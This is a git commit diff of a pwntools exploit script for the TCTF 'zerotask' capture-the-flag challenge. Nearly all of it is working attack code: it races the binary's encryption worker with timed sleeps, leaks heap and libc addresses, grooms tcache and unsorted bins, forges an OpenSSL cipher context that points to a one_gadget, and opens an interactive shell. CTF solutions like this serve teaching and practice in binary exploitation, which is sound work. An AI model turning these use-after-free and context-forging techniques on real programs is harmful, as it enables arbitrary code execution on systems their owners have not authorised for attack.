54bfed698129695791abaa59bc1afd73bb8622ca
fantasy <3280907645@qq.com>
2019-03-25 03:24:12 -0700

    tctf:zerotask

--- tctf/zerotask/exp.py
+++ tctf/zerotask/exp.py
@@ -1,5 +1,5 @@
 from pwn import *
-
+from time import sleep
 debug=1
 # context.log_level='debug'
 
@@ -27,9 +27,12 @@ def add(id,type,key,iv,sz,data):
     sla('Data Size : ',str(sz))
     sa('Data : ',data)    
 
-def add_fast(id,type,key,iv,sz,data):
+def add_fast(id,type,key,iv,sz, data , delay=0):
     ru('Choice: ')
-    se('1\n'+str(id)+'\n'+str(type)+'\n'+key+iv+str(sz)+'\n'+data)
+    se('1\n'+str(id)+'\n'+str(type)+'\n'+key+iv+str(sz)+'\n')
+    if delay != 0:
+        sleep(delay)
+    se(data)
     
 
 def add_check(id,type,key,iv,sz,data):
@@ -58,6 +61,15 @@ def dec(sz,data):
     w.close() 
     return data
 
+def get_data():
+    ru('Ciphertext: \n')
+    tmp = ''
+    for i in range(5):
+        t = ru('\n')[:-2].split(' ')
+        for q in t:
+            tmp+=chr(int(q,16))
+    return tmp
+
 if debug:
     p=process('./zerotask' )
 else:
@@ -74,79 +86,52 @@ for i in range(3):
 
 for i in range(2):
     delete(i)
-# 0x80 -> 4
-# 0x1c0 -> 2
-# remain id = 2
 
 for i in range(2):
     add(i,1,'a'*32,'b'*16,0x40,'t'*0x40)
-# 0x80 -> 3  ; 0x170 - > 1
 go(1)
  
 delete(1) # controller chunk delete in tcache last
 
-# fake a ctx # now_data_size > before_data_size
-cmd(1)
+# fake a ctx 
+add(8 , 1 , "a" * 32 , "b" * 16 , 0x70 , "t" * 0x70 , delay = 3)
 
-sla('Task id : ',str(8)) # id don't equal , but the controller chunk is the same one
-sla('Encrypt(1) / Decrypt(2): ',str(1))
-sa('Key : ','a'*32)
-sa('IV : ','b'*16)
-sla('Data Size : ',str(0x70))
-ru('Data : ')
-ru('Ciphertext: \n') # wait go result
-
-tmp = ''
-for i in range(8):
-    t = ru('\n')[:-2].split(' ')
-    for q in t:
-        tmp+=chr(int(q,16))
+tmp = get_data()
 heap = u64(dec(len(tmp),tmp)[:8]) - 0x14c0
 log.info("heap:" + hex(heap))
 # tcachebins 
     # 0x40 1
     # 0x70 1 -> leaked
-se('a'*0x70)
+# se('a'*0x70)
 # leak libc
 add(5,1,'a'*32,'b'*16,0x40,'a'*0x40)
 # clear bins
-for i in range(10):
-    add(i+10,1,'a'*32,'b'*16,0x90,'a'*0x90)
-# fill tcache
-for i in range(9):
-    delete(i+10)
 
-go(19)
-delete(19) # to unsorted bin
+for i in range(9):
+    add(i+10,1,'a'*32,'b'*16,0x90,'a'*0x90)
+
+# fill tcache
+for i in range(7):
+    delete(i+10)
+# gdb.attach(p)
+go(18)
+delete(18) # to unsorted bin
 # clear tcache
 for i in range(7):
     add(i+10,1,'a'*32,'b'*16,0x90,'a'*0x90)
-# use unsorted bins
-# fastbin # 0x80 # 1
-# unsorted bin # 0x80 -> 0x420
-cmd(1)
-sla('Task id : ',str(18))
-sla('Encrypt(1) / Decrypt(2): ',str(1))
-sa('Key : ','a'*32)
-sa('IV : ','b'*16)
-sla('Data Size : ',str(0x40)) # split from unsorted bin
-ru('Data : ')
-ru('Ciphertext: \n')
 
-tmp = ''
-for i in range(5):
-    t = ru('\n')[:-2].split(' ')
-    for q in t:
-        tmp+=chr(int(q,16))
+add(17 , 1 , "a" * 32 , "b" * 16 , 0x40 , "t" * 0x40 , delay = 3)
 
-se('a'*0x40)
+# ru('Ciphertext: \n')
 
+tmp = get_data()
 libc = u64(dec(len(tmp),tmp)[:8])
 base = libc - 0x3ebc40 - 0x60
 log.info("libc : " + hex(base))
 # end
 # heap fengshui?
-fake = heap + 0x38A0 # data_ptr_chunk addr
+fake = heap + 0x3b80 # data_ptr_chunk addr
+log.info("------------->" + hex(fake + 8))
 # fake ctx chunk
 # target_expolit in function EVP_CipherUpdate
 # v5 = *ctx
@@ -154,11 +139,14 @@ fake = heap + 0x38A0 # data_ptr_chunk addr
 #   (v5 + 0x20))(ctx, a2, 0LL, 0LL)
 tmp = p64(fake+8) # 
 tmp += p64(0x00000010000001ab)+p64(0x0000001000000020)
-tmp += p64(0x0000000000001002)+p64(0xdeadbeef) # 0xdeadbeef for | if(*(_BYTE *)(v5 + 0x12) & 0x10):
+tmp += p64(0x0000000000001002)+p64(0x0) # 0x0000000000001002 for | if(*(_BYTE *)(v5 + 0x12) & 0x10):
 tmp += p64(base+0x10a38c)  # one_gadget 
 tmp = tmp.ljust(0x90,'\x00')
-# 
+
+#
+# gdb.attach(p , "b malloc\nc\n") 
 add(30,1,'a'*32,'b'*16,0x90,tmp)
+
 for i in range(4):
     add(i+31,1,'a'*32,'b'*16,0x70,'a'*0x70)
 
@@ -187,14 +175,11 @@ delete(31)
 exp = 'd'*88+p64(fake) # 0x58 # controller ctx_pointer  
 exp = exp.ljust(0x70,'e')
 
-from time import sleep
-sleep(1.5)
-
-add_fast(31,1,'a'*32,'b'*16,0x70,exp) # data_ptr is 32's controller chunk
+add(31,1,'a'*32,'b'*16,0x70,exp , 1.5) # data_ptr is 32's controller chunk
 # malloc 0x80 # 31's controller
 # 0xa0    # 31's
 # 0x100   # 31's
 # 0x80    # 32's  controller
 
 ru("Choice:")
-p.interactive()    
+p.interactive()   
